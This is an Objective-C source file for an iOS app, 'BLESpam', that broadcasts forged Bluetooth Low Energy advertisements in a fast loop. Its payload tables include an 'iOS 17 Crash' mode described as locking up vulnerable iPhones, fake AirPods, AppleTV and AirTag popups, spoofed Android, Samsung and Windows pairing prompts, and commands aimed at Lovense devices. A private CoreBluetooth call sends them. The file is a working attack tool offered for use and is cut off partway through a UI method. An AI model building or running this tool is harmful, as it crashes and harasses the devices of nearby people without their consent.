/**
 * BLESpam — iOS 18 Style
 * Full redesign with all Flipper Zero BLE Spam modes.
 *
 * Tabs:
 *   0  Payloads  — mode picker + start/stop card
 *   1  Timing    — delay presets + slider
 *   2  Custom    — raw HEX input
 *   3  Logs      — live packet console
 */

#import <UIKit/UIKit.h>
#import <CoreBluetooth/CoreBluetooth.h>
#import <objc/message.h>

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Design tokens
// ─────────────────────────────────────────────────────────────────────────────

#define CLR_BG          [UIColor colorWithRed:0   green:0   blue:0   alpha:1]
#define CLR_CARD        [UIColor colorWithRed:.11 green:.11 blue:.12 alpha:1]   // #1C1C1E
#define CLR_FIELD       [UIColor colorWithRed:.17 green:.17 blue:.18 alpha:1]   // #2C2C2E
#define CLR_SEP         [UIColor colorWithWhite:1 alpha:.12]
#define CLR_ACCENT      [UIColor colorWithRed:.04 green:.52 blue:1   alpha:1]   // #0A84FF
#define CLR_ORANGE      [UIColor colorWithRed:1   green:.62 blue:.04 alpha:1]   // #FF9F0A
#define CLR_SUCCESS     [UIColor colorWithRed:.19 green:.82 blue:.35 alpha:1]   // #30D158
#define CLR_DANGER      [UIColor colorWithRed:1   green:.27 blue:.23 alpha:1]   // #FF453A
#define CLR_FG          [UIColor whiteColor]
#define CLR_FG2         [UIColor colorWithRed:.56 green:.56 blue:.58 alpha:1]   // #8E8E93
#define CLR_FG3         [UIColor colorWithRed:.39 green:.39 blue:.40 alpha:1]   // #636366
#define CORNER_CARD     12.0
#define CORNER_BTN      10.0

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - BLE Payload definitions
// ─────────────────────────────────────────────────────────────────────────────

typedef NS_ENUM(NSInteger, BLEMode) {
    BLEModeKitchenSink = 0,
    BLEModeiOS17Crash,
    BLEModeAppleActionModal,
    BLEModeAppleDevicePopup,
    BLEModeAndroidFastPair,
    BLEModeSamsungEasySetup,
    BLEModeWindowsSwiftPair,
    BLEModeLovespouse,
    BLEModeCustom,
    BLEModeCount
};

static NSString *modeNames[BLEModeCount] = {
    @"Kitchen Sink",
    @"iOS 17 Crash",
    @"Apple Action Modal",
    @"Apple Device Popup",
    @"Android Fast Pair",
    @"Samsung Easy Setup",
    @"Windows Swift Pair",
    @"LoveSpouse",
    @"Custom HEX",
};

static NSString *modeDescriptions[BLEModeCount] = {
    @"All payloads in random order — maximum chaos",
    @"Continuity packets that lock up vulnerable iOS 17 devices",
    @"System action popups: AppleTV, HomePod, iPhone Setup",
    @"Proximity Pairing cards: AirPods, Beats, AirTag",
    @"Google Fast Pair (0xFE2C) — triggers Android pairing notifications",
    @"Samsung Galaxy Buds/Watch Easy Setup packets",
    @"Microsoft Swift Pair (0x0006) — Windows 10/11 pairing popups",
    @"Lovense smart-device broadcast commands",
    @"Custom raw HEX manufacturer data",
};

// ── Helpers ───────────────────────────────────────────────────────────────────

static NSData *bytes(const uint8_t *b, NSUInteger len) {
    return [NSData dataWithBytes:b length:len];
}

// Apple Continuity: company 0x004C
#define APPLE(...)  bytes((uint8_t[]){0x4C,0x00,__VA_ARGS__}, sizeof((uint8_t[]){0x4C,0x00,__VA_ARGS__}))

// Google Fast Pair service data (UUID 0xFE2C)
#define FASTPAIR(a,b,c) bytes((uint8_t[]){a,b,c}, 3)

// Samsung (company 0x0075)
#define SAMSUNG(...)  bytes((uint8_t[]){0x75,0x00,__VA_ARGS__}, sizeof((uint8_t[]){0x75,0x00,__VA_ARGS__}))

// Microsoft Swift Pair (company 0x0006)
#define SWIFT(...)  bytes((uint8_t[]){0x06,0x00,0x03,__VA_ARGS__}, sizeof((uint8_t[]){0x06,0x00,0x03,__VA_ARGS__}))

// Lovense (company 0x0059)
#define LOVENSE(...) bytes((uint8_t[]){0x59,0x00,__VA_ARGS__}, sizeof((uint8_t[]){0x59,0x00,__VA_ARGS__}))

// ── Payload tables ────────────────────────────────────────────────────────────

static NSArray *payloadsForMode(BLEMode mode, NSData *customData) {
    switch (mode) {

    // ── iOS 17 Crash ──────────────────────────────────────────────────────────
    case BLEModeiOS17Crash:
        return @[
            // Modified Nearby Action with crash-triggering flags
            APPLE(0x0F,0x05,0xFF,0xFF,0xFF,0xFF,0xFF),
            APPLE(0x0F,0x05,0xC0,0xFF,0xFF,0xFF,0xFF),
            APPLE(0x0F,0x05,0x80,0xFF,0xFF,0xFF,0xFF),
            APPLE(0x0F,0x05,0x40,0xFF,0xFF,0xFF,0xFF),
        ];

    // ── Apple Action Modal ────────────────────────────────────────────────────
    case BLEModeAppleActionModal:
        return @[
            // AppleTV Setup
            APPLE(0x04,0x05,0x03,0xC0,0x57,0xAA,0x01),
            // AppleTV Pair
            APPLE(0x04,0x05,0x03,0xC0,0x57,0xAA,0x02),
            // AppleTV New User
            APPLE(0x04,0x05,0x03,0xC0,0x57,0xAA,0x03),
            // Setup New iPhone
            APPLE(0x04,0x05,0x01,0xC0,0x57,0xAA,0x00),
            // Transfer Phone Number
            APPLE(0x04,0x05,0x02,0xC0,0x57,0xAA,0x00),
            // HomePod Setup
            APPLE(0x04,0x05,0x0D,0xC0,0x57,0xAA,0x00),
            // Apple Watch
            APPLE(0x04,0x05,0x0B,0xC0,0x57,0xAA,0x00),
        ];

    // ── Apple Device Popup (Proximity Pairing) ────────────────────────────────
    case BLEModeAppleDevicePopup:
        return @[
            // AirPods Pro (2nd gen)
            APPLE(0x07,0x19,0x07,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirPods (3rd gen)
            APPLE(0x07,0x19,0x13,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirPods Max
            APPLE(0x07,0x19,0x0A,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirPods (2nd gen)
            APPLE(0x07,0x19,0x0F,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // Beats Solo Pro
            APPLE(0x07,0x19,0x0C,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // Powerbeats Pro
            APPLE(0x07,0x19,0x0B,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirTag
            APPLE(0x12,0x19,0x10,0x00,0x48,0xB3,0x5A,0x44,0x77,0x03,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00),
        ];

    // ── Android Fast Pair ─────────────────────────────────────────────────────
    case BLEModeAndroidFastPair:
        // Service UUID 0xFE2C, 3-byte model IDs
        return @[
            FASTPAIR(0x2B,0x41,0x02),   // Galaxy Buds Pro
            FASTPAIR(0x2B,0x41,0x0A),   // Galaxy Buds 2
            FASTPAIR(0x2B,0x41,0x0C),   // Galaxy Buds Live
            FASTPAIR(0x2B,0x41,0x06),   // Pixel Buds A
            FASTPAIR(0xF5,0x36,0x01),   // Pixel Buds Pro
            FASTPAIR(0x82,0xD3,0x00),   // JBL Flip 6
            FASTPAIR(0xCC,0xCA,0x00),   // Sony WH-1000XM4
            FASTPAIR(0x71,0x8B,0x00),   // Bose QuietComfort 45
        ];

    // ── Samsung Easy Setup ────────────────────────────────────────────────────
    case BLEModeSamsungEasySetup:
        return @[
            // Galaxy Buds Live  (0x0060)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x00,0x00),
            // Galaxy Buds Pro   (0x0061)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x61,0x00,0x00,0x00,0x00,0x00),
            // Galaxy Buds 2     (0x00EE)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0xEE,0x00,0x00,0x00,0x00,0x00),
            // Galaxy Watch 4    (0x0246)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x46,0x02,0x00,0x00,0x00,0x00),
            // Galaxy Watch 5    (0x02C4)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0xC4,0x02,0x00,0x00,0x00,0x00),
            // Galaxy Watch 6    (0x0326)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x26,0x03,0x00,0x00,0x00,0x00),
        ];

    // ── Windows Swift Pair ────────────────────────────────────────────────────
    case BLEModeWindowsSwiftPair:
        return @[
            // Headphones
            SWIFT(0x00,0x80),
            // Keyboard
            SWIFT(0x00,0x40),
            // Mouse
            SWIFT(0x00,0x20),
            // Gamepad
            SWIFT(0x00,0x10),
            // Printer
            SWIFT(0x00,0x08),
        ];

    // ── Lovespouse / Lovense ──────────────────────────────────────────────────
    case BLEModeLovespouse:
        return @[
            LOVENSE(0x01,0x00,0x0A,0x00,0x00),
            LOVENSE(0x01,0x00,0x14,0x00,0x00),
            LOVENSE(0x01,0x00,0x1E,0x00,0x00),
            LOVENSE(0x02,0x00,0x0A,0x00,0x00),
            LOVENSE(0x03,0x00,0x0A,0x00,0x00),
        ];

    // ── Custom ────────────────────────────────────────────────────────────────
    case BLEModeCustom:
        return customData ? @[customData] : @[];

    // ── Kitchen Sink (все пакеты вместе) ──────────────────────────────────────
    case BLEModeKitchenSink:
    default: {
        NSMutableArray *all = [NSMutableArray array];
        for (BLEMode m = BLEModeiOS17Crash; m <= BLEModeLovespouse; m++) {
            [all addObjectsFromArray:payloadsForMode(m, nil)];
        }
        // Shuffle
        for (NSUInteger i = all.count - 1; i > 0; i--) {
            NSUInteger j = arc4random_uniform((uint32_t)(i + 1));
            [all exchangeObjectAtIndex:i withObjectAtIndex:j];
        }
        return all;
    }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - BLESpamEngine
// ─────────────────────────────────────────────────────────────────────────────

@interface BLESpamEngine : NSObject <CBPeripheralManagerDelegate>

@property (nonatomic, strong) CBPeripheralManager *pm;
@property (nonatomic, assign) BOOL isSpamming;
@property (nonatomic, assign) BLEMode mode;
@property (nonatomic, assign) NSTimeInterval interval;   // seconds
@property (nonatomic, strong) NSData *customPayload;

// Stats
@property (nonatomic, assign) NSUInteger totalSent;
@property (nonatomic, assign) NSUInteger pps;            // packets/sec last window

// Callbacks
@property (nonatomic, copy) void (^onStateChange)(BOOL isOn);
@property (nonatomic, copy) void (^onPacketSent)(NSData *payload, NSUInteger total);
@property (nonatomic, copy) void (^onError)(NSString *msg);

+ (instancetype)shared;
- (void)start;
- (void)stop;

@end

static BLESpamEngine *gEngine;

@implementation BLESpamEngine {
    NSTimer  *_timer;
    NSArray  *_payloads;
    NSUInteger _idx;
    NSUInteger _windowCount;
    NSTimer  *_ppsTimer;
}

+ (instancetype)shared {
    static dispatch_once_t t;
    dispatch_once(&t, ^{ gEngine = [self new]; });
    return gEngine;
}

- (instancetype)init {
    self = [super init];
    _mode = BLEModeAppleDevicePopup;
    _interval = 0.1;
    return self;
}

// ── Private BLE advertise ─────────────────────────────────────────────────────

- (void)advertise:(NSData *)d {
    NSDictionary *ad = @{CBAdvertisementDataManufacturerDataKey: d};
    SEL sel = NSSelectorFromString(
        @"_startAdvertisingWithAdvertisementData:andMask:andFlags:andCompletionHandler:"
    );
    if ([_pm respondsToSelector:sel]) {
        NSMethodSignature *sig = [_pm methodSignatureForSelector:sel];
        NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
        inv.target = _pm; inv.selector = sel;
        [inv setArgument:&ad atIndex:2];
        uint8_t mask = 0x00, flags = 0x06;
        [inv setArgument:&mask  atIndex:3];
        [inv setArgument:&flags atIndex:4];
        id h = nil; [inv setArgument:&h atIndex:5];
        [inv invoke];
    } else {
        [_pm startAdvertising:ad];
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

- (void)start {
    if (_isSpamming) return;
    _totalSent = 0; _idx = 0; _windowCount = 0; _pps = 0;
    _pm = [[CBPeripheralManager alloc] initWithDelegate:self
                                                  queue:dispatch_get_main_queue()
                                                options:@{CBPeripheralManagerOptionShowPowerAlertKey:@YES}];
}

- (void)stop {
    [_timer invalidate]; _timer = nil;
    [_ppsTimer invalidate]; _ppsTimer = nil;
    [_pm stopAdvertising]; _pm = nil;
    _isSpamming = NO;
    if (_onStateChange) _onStateChange(NO);
}

- (void)startLoop {
    _isSpamming = YES;
    if (_onStateChange) _onStateChange(YES);
    _payloads = payloadsForMode(_mode, _customPayload);
    if (!_payloads.count) { [self stop]; return; }

    [self sendNext];
    [_timer invalidate];
    _timer = [NSTimer scheduledTimerWithTimeInterval:_interval
                                             repeats:YES
                                               block:^(NSTimer *t){ [self sendNext]; }];

    // PPS counter: reset window every 1s
    _ppsTimer = [NSTimer scheduledTimerWithTimeInterval:1.0
                                                repeats:YES
                                                  block:^(NSTimer *t){
        self->_pps = self->_windowCount;
        self->_windowCount = 0;
    }];
}

- (void)sendNext {
    if (!_payloads.count) return;
    if (_idx >= _payloads.count) {
        _idx = 0;
        // Reshuffle Kitchen Sink
        if (_mode == BLEModeKitchenSink) {
            _payloads = payloadsForMode(BLEModeKitchenSink, nil);
        }
    }
    NSData *d = _payloads[_idx++];
    [_pm stopAdvertising];
    [self advertise:d];
    _totalSent++;
    _windowCount++;
    if (_onPacketSent) _onPacketSent(d, _totalSent);
}

// ── Dynamic interval update (no restart needed) ───────────────────────────────

- (void)setInterval:(NSTimeInterval)interval {
    _interval = interval;
    if (_isSpamming) {
        [_timer invalidate];
        _timer = [NSTimer scheduledTimerWithTimeInterval:_interval
                                                 repeats:YES
                                                   block:^(NSTimer *t){ [self sendNext]; }];
    }
}

// ── CBPeripheralManagerDelegate ───────────────────────────────────────────────

- (void)peripheralManagerDidUpdateState:(CBPeripheralManager *)p {
    dispatch_async(dispatch_get_main_queue(), ^{
        switch (p.state) {
            case CBManagerStatePoweredOn:  [self startLoop]; break;
            case CBManagerStatePoweredOff: [self stop]; if (self->_onError) self->_onError(@"Bluetooth is off."); break;
            case CBManagerStateUnauthorized: [self stop]; if (self->_onError) self->_onError(@"Bluetooth permission denied."); break;
            default: break;
        }
    });
}

- (void)peripheralManagerDidStartAdvertising:(CBPeripheralManager *)p error:(NSError *)e {}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - UI helpers & mode icons
// ─────────────────────────────────────────────────────────────────────────────

static NSString *modeIcons[BLEModeCount] = {
    @"sparkles",
    @"exclamationmark.shield.fill",
    @"appletv.fill",
    @"airpodspro",
    @"wave.3.right",
    @"earbuds",
    @"desktopcomputer",
    @"bolt.horizontal.fill",
    @"chevron.left.forwardslash.chevron.right",
};

static UIColor *modeIconColor(BLEMode mode) {
    switch (mode) {
        case BLEModeKitchenSink:      return CLR_ACCENT;
        case BLEModeiOS17Crash:       return CLR_DANGER;
        case BLEModeAppleActionModal: return [UIColor colorWithRed:.35 green:.34 blue:.84 alpha:1]; // systemIndigo
        case BLEModeAppleDevicePopup: return CLR_ACCENT;
        case BLEModeAndroidFastPair:  return CLR_SUCCESS;
        case BLEModeSamsungEasySetup: return [UIColor colorWithRed:.19 green:.69 blue:.78 alpha:1]; // systemTeal
        case BLEModeWindowsSwiftPair: return [UIColor colorWithRed:.20 green:.68 blue:.90 alpha:1]; // systemCyan
        case BLEModeLovespouse:       return [UIColor colorWithRed:1.0 green:.18 blue:.33 alpha:1]; // systemPink
        case BLEModeCustom:           return CLR_ORANGE;
        default:                      return CLR_ACCENT;
    }
}

static UIImage *settingsBadgeImage(NSString *symbolName, UIColor *bgColor) {
    CGSize size = CGSizeMake(29, 29);
    UIGraphicsImageRenderer *renderer = [[UIGraphicsImageRenderer alloc] initWithSize:size];
    return [renderer imageWithActions:^(UIGraphicsImageRendererContext *ctx) {
        UIBezierPath *path = [UIBezierPath bezierPathWithRoundedRect:CGRectMake(0, 0, size.width, size.height)
                                                        cornerRadius:7.0];
        [bgColor setFill];
        [path fill];

        UIImageSymbolConfiguration *symCfg = [UIImageSymbolConfiguration configurationWithPointSize:14
                                                                                             weight:UIImageSymbolWeightSemibold];
        UIImage *sym = [[UIImage systemImageNamed:symbolName withConfiguration:symCfg]
                        imageWithTintColor:UIColor.whiteColor
                             renderingMode:UIImageRenderingModeAlwaysOriginal];
        if (sym) {
            CGSize s = sym.size;
            CGRect r = CGRectMake((size.width - s.width) * 0.5, (size.height - s.height) * 0.5, s.width, s.height);
            [sym drawInRect:r];
        }
    }];
}

static UILabel *label(NSString *text, UIFont *font, UIColor *color) {
    UILabel *l = [UILabel new];
    l.text = text; l.font = font; l.textColor = color;
    l.translatesAutoresizingMaskIntoConstraints = NO;
    return l;
}

static UIView *separator(void) {
    UIView *v = [[UIView alloc] initWithFrame:CGRectZero];
    v.backgroundColor = CLR_SEP;
    v.translatesAutoresizingMaskIntoConstraints = NO;
    return v;
}

static UIView *card(void) {
    UIView *v = [[UIView alloc] initWithFrame:CGRectZero];
    v.backgroundColor = CLR_CARD;
    v.layer.cornerRadius = CORNER_CARD;
    v.layer.cornerCurve = kCACornerCurveContinuous;
    v.translatesAutoresizingMaskIntoConstraints = NO;
    return v;
}

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Status View (compact native row inside grouped section)
// ─────────────────────────────────────────────────────────────────────────────

@interface StatusCardView : UIView
@property UILabel *modeLbl, *statusLbl, *delayLbl, *ppsLbl;
@property UIView *statusDot;
- (void)updateWithMode:(BLEMode)m active:(BOOL)active delay:(NSTimeInterval)d pps:(NSUInteger)pps packets:(NSUInteger)pkts;
@end

@implementation StatusCardView

- (instancetype)init {
    self = [super init];
    self.backgroundColor = UIColor.clearColor;
    self.translatesAutoresizingMaskIntoConstraints = NO;

    _statusDot = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 8, 8)];
    _statusDot.layer.cornerRadius = 4;
    _statusDot.backgroundColor = CLR_FG3;
    _statusDot.translatesAutoresizingMaskIntoConstraints = NO;
    [self addSubview:_statusDot];

    _statusLbl = label(@"Idle", [UIFont systemFontOfSize:13 weight:UIFontWeightMedium], CLR_FG2);
    _modeLbl   = label(@"—", [UIFont systemFontOfSize:16 weight:UIFontWeightSemibold], CLR_FG);
    _delayLbl  = label(@"—", [UIFont monospacedDigitSystemFontOfSize:12 weight:UIFontWeightRegular], CLR_FG2);
    _ppsLbl    = label(@"0 pps", [UIFont monospacedDigitSystemFontOfSize:15 weight:UIFontWeightSemibold], CLR_FG2);
    _ppsLbl.textAlignment = NSTextAlignmentRight;

    [self addSubview:_statusLbl];
    [self addSubview:_modeLbl];
    [self addSubview:_delayLbl];
    [self addSubview:_ppsLbl];

    [NSLayoutConstraint activateConstraints:@[
        [_modeLbl.leadingAnchor    constraintEqualToAnchor:self.leadingAnchor constant:16],
        [_modeLbl.topAnchor        constraintEqualToAnchor:self.topAnchor constant:12],
        [_modeLbl.trailingAnchor   constraintLessThanOrEqualToAnchor:_ppsLbl.leadingAnchor constant:-12],

        [_delayLbl.leadingAnchor   constraintEqualToAnchor:self.leadingAnchor constant:16],
        [_delayLbl.topAnchor       constraintEqualToAnchor:_modeLbl.bottomAnchor constant:3],
        [_delayLbl.bottomAnchor    constraintEqualToAnchor:self.bottomAnchor constant:-12],

        [_ppsLbl.trailingAnchor    constraintEqualToAnchor:self.trailingAnchor constant:-16],
        [_ppsLbl.centerYAnchor     constraintEqualToAnchor:_modeLbl.centerYAnchor],

        [_statusLbl.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-16],
        [_statusLbl.centerYAnchor  constraintEqualToAnchor:_delayLbl.centerYAnchor],

        [_statusDot.trailingAnchor constraintEqualToAnchor:_statusLbl.leadingAnchor constant:-6],
        [_statusDot.centerYAnchor  constraintEqualToAnchor:_statusLbl.centerYAnchor],
        [_statusDot.widthAnchor    constraintEqualToConstant:8],
        [_statusDot.heightAnchor   constraintEqualToConstant:8],
    ]];
    return self;
}

- (void)updateWithMode:(BLEMode)m active:(BOOL)active delay:(NSTimeInterval)d pps:(NSUInteger)pps packets:(NSUInteger)pkts {
    _modeLbl.text  = modeNames[m];
    _delayLbl.text = [NSString stringWithFormat:@"%lu ms interval · %lu sent", (unsigned long)(d * 1000), (unsigned long)pkts];
    _ppsLbl.text   = [NSString stringWithFormat:@"%lu pps", (unsigned long)pps];
    if (active) {
        _statusLbl.text            = @"Broadcasting";
        _statusLbl.textColor       = CLR_ORANGE;
        _statusDot.backgroundColor = CLR_ORANGE;
        _ppsLbl.textColor          = CLR_ORANGE;
    } else {
        _statusLbl.text            = @"Ready";
        _statusLbl.textColor       = CLR_FG2;
        _statusDot.backgroundColor = CLR_FG3;
        _ppsLbl.textColor          = CLR_FG2;
    }
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Payloads Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface PayloadsVC : UIViewController <UITableViewDelegate, UITableViewDataSource>
@property StatusCardView *statusCard;
@property UIButton       *startStopBtn;
@property UITableView    *tableView;
@property NSTimer        *uiTimer;
@property CAShapeLayer   *pulseLayer;
@end

@implementation PayloadsVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;
    self.navigationItem.title = @"Payloads";
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeNever;

    _statusCard = [StatusCardView new];

    _startStopBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    _startStopBtn.translatesAutoresizingMaskIntoConstraints = NO;
    _startStopBtn.titleLabel.font = [UIFont systemFontOfSize:16 weight:UIFontWeightSemibold];
    _startStopBtn.tintColor = CLR_FG;
    _startStopBtn.backgroundColor = CLR_ACCENT;
    _startStopBtn.layer.cornerRadius = CORNER_BTN;
    _startStopBtn.layer.cornerCurve = kCACornerCurveContinuous;
    [_startStopBtn addTarget:self action:@selector(toggleSpam) forControlEvents:UIControlEventTouchUpInside];

    _tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    _tableView.translatesAutoresizingMaskIntoConstraints = NO;
    _tableView.backgroundColor = CLR_BG;
    _tableView.separatorColor = CLR_SEP;
    _tableView.delegate = self;
    _tableView.dataSource = self;
    _tableView.rowHeight = UITableViewAutomaticDimension;
    _tableView.estimatedRowHeight = 56;
    [_tableView registerClass:[UITableViewCell class] forCellReuseIdentifier:@"modeCell"];
    [self.view addSubview:_tableView];

    [NSLayoutConstraint activateConstraints:@[
        [_tableView.topAnchor      constraintEqualToAnchor:self.view.topAnchor],
        [_tableView.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor],
        [_tableView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_tableView.bottomAnchor   constraintEqualToAnchor:self.view.bottomAnchor],
    ]];

    [self updateUI];
}

- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    [self updateUI];
    [_tableView reloadData];
    _uiTimer = [NSTimer scheduledTimerWithTimeInterval:0.5 repeats:YES block:^(NSTimer *t){ [self updateUI]; }];
}

- (void)viewWillDisappear:(BOOL)animated {
    [super viewWillDisappear:animated];
    [_uiTimer invalidate]; _uiTimer = nil;
}

- (void)updateUI {
    BLESpamEngine *e = BLESpamEngine.shared;
    [_statusCard updateWithMode:e.mode active:e.isSpamming delay:e.interval pps:e.pps packets:e.totalSent];

    UIImageSymbolConfiguration *symCfg = [UIImageSymbolConfiguration configurationWithPointSize:14 weight:UIImageSymbolWeightSemibold];
    if (e.isSpamming) {
        UIImage *stopImg = [UIImage systemImageNamed:@"stop.fill" withConfiguration:symCfg];
        [_startStopBtn setImage:stopImg forState:UIControlStateNormal];
        [_startStopBtn setTitle:@"  Stop Broadcast" forState:UIControlStateNormal];
        _startStopBtn.backgroundColor = CLR_DANGER;
        [self animatePulse:NO];
    } else {
        UIImage *playImg = [UIImage systemImageNamed:@"dot.radiowaves.left.and.right" withConfiguration:symCfg];
        [_startStopBtn setImage:playImg forState:UIControlStateNormal];
        [_startStopBtn setTitle:@"  Start Broadcast" forState:UIControlStateNormal];
        _startStopBtn.backgroundColor = CLR_ACCENT;
        [self animatePulse:NO];
    }
}

- (void)animatePulse:(BOOL)on {
    [_pulseLayer removeFromSuperlayer];
    _pulseLayer = nil;
}

- (void)toggleSpam {
    BLESpamEngine *e = BLESpamEngine.shared;
    UIImpactFeedbackGenerator *hap = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleMedium];
    [hap impactOccurred];
    if (e.isSpamming) { [e stop]; } else { [e start]; }
    [self updateUI];
}

// ── UITableView ───────────────────────────────────────────────────────────────

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tv { return 2; }

- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s {
    return (s == 0) ? 2 : BLEModeCount;
}

- (NSString *)tableView:(UITableView *)tv titleForHeaderInSection:(NSInteger)s {
    return (s == 0) ? @"Broadcast Control" : @"Advertising Mode";
}

- (NSString *)tableView:(UITableView *)tv titleForFooterInSection:(NSInteger)s {
    if (s == 1) {
        return @"Select a proximity payload profile. Mode changes apply on the next packet cycle.";
    }
    return nil;
}

- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    if (ip.section == 0) {
        UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:nil];
        cell.backgroundColor = CLR_CARD;
        cell.selectionStyle = UITableViewCellSelectionStyleNone;

        if (ip.row == 0) {
            [_statusCard removeFromSuperview];
            [cell.contentView addSubview:_statusCard];
            [NSLayoutConstraint activateConstraints:@[
                [_statusCard.topAnchor      constraintEqualToAnchor:cell.contentView.topAnchor],
                [_statusCard.leadingAnchor  constraintEqualToAnchor:cell.contentView.leadingAnchor],
                [_statusCard.trailingAnchor constraintEqualToAnchor:cell.contentView.trailingAnchor],
                [_statusCard.bottomAnchor   constraintEqualToAnchor:cell.contentView.bottomAnchor],
            ]];
        } else {
            [_startStopBtn removeFromSuperview];
            [cell.contentView addSubview:_startStopBtn];
            [NSLayoutConstraint activateConstraints:@[
                [_startStopBtn.topAnchor      constraintEqualToAnchor:cell.contentView.topAnchor constant:8],
                [_startStopBtn.leadingAnchor  constraintEqualToAnchor:cell.contentView.leadingAnchor constant:12],
                [_startStopBtn.trailingAnchor constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-12],
                [_startStopBtn.bottomAnchor   constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-8],
                [_startStopBtn.heightAnchor   constraintEqualToConstant:44],
            ]];
        }
        return cell;
    }

    UITableViewCell *cell = [tv dequeueReusableCellWithIdentifier:@"modeCell" forIndexPath:ip];
    cell.backgroundColor = CLR_CARD;

    BLEMode m = (BLEMode)ip.row;
    UIListContentConfiguration *cfg = [cell defaultContentConfiguration];
    cfg.text = modeNames[m];
    cfg.secondaryText = modeDescriptions[m];
    cfg.image = settingsBadgeImage(modeIcons[m], modeIconColor(m));
    cfg.imageToTextPadding = 12;
    cfg.textProperties.color = CLR_FG;
    cfg.secondaryTextProperties.color = CLR_FG2;
    cfg.textProperties.font = [UIFont systemFontOfSize:16 weight:UIFontWeightRegular];
    cfg.secondaryTextProperties.font = [UIFont systemFontOfSize:12 weight:UIFontWeightRegular];
    cfg.directionalLayoutMargins = NSDirectionalEdgeInsetsMake(10, 16, 10, 16);
    cell.contentConfiguration = cfg;

    UIView *selBg = [UIView new];
    selBg.backgroundColor = CLR_FIELD;
    cell.selectedBackgroundView = selBg;

    cell.accessoryType = (ip.row == (NSInteger)BLESpamEngine.shared.mode)
        ? UITableViewCellAccessoryCheckmark : UITableViewCellAccessoryNone;
    cell.tintColor = CLR_ACCENT;
    return cell;
}

- (void)tableView:(UITableView *)tv didSelectRowAtIndexPath:(NSIndexPath *)ip {
    [tv deselectRowAtIndexPath:ip animated:YES];
    if (ip.section != 1) return;
    BLESpamEngine.shared.mode = (BLEMode)ip.row;
    [self updateUI];
    [tv reloadSections:[NSIndexSet indexSetWithIndex:1] withRowAnimation:UITableViewRowAnimationNone];
    UISelectionFeedbackGenerator *f = [UISelectionFeedbackGenerator new];
    [f selectionChanged];
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Timing Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface TimingVC : UIViewController <UITableViewDataSource, UITableViewDelegate>
@property UILabel *valueLabel;
@property UISlider *slider;
@property UISegmentedControl *presets;
@property UITableView *tableView;
@end

@implementation TimingVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;
    self.navigationItem.title = @"Timing";
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeNever;

    _presets = [[UISegmentedControl alloc] initWithItems:@[@"20ms", @"50ms", @"100ms", @"200ms", @"500ms"]];
    _presets.translatesAutoresizingMaskIntoConstraints = NO;
    _presets.selectedSegmentIndex = 2;
    _presets.selectedSegmentTintColor = CLR_ACCENT;
    [_presets setTitleTextAttributes:@{
        NSForegroundColorAttributeName: CLR_FG,
        NSFontAttributeName: [UIFont systemFontOfSize:13 weight:UIFontWeightMedium]
    } forState:UIControlStateNormal];
    [_presets setTitleTextAttributes:@{
        NSForegroundColorAttributeName: CLR_FG,
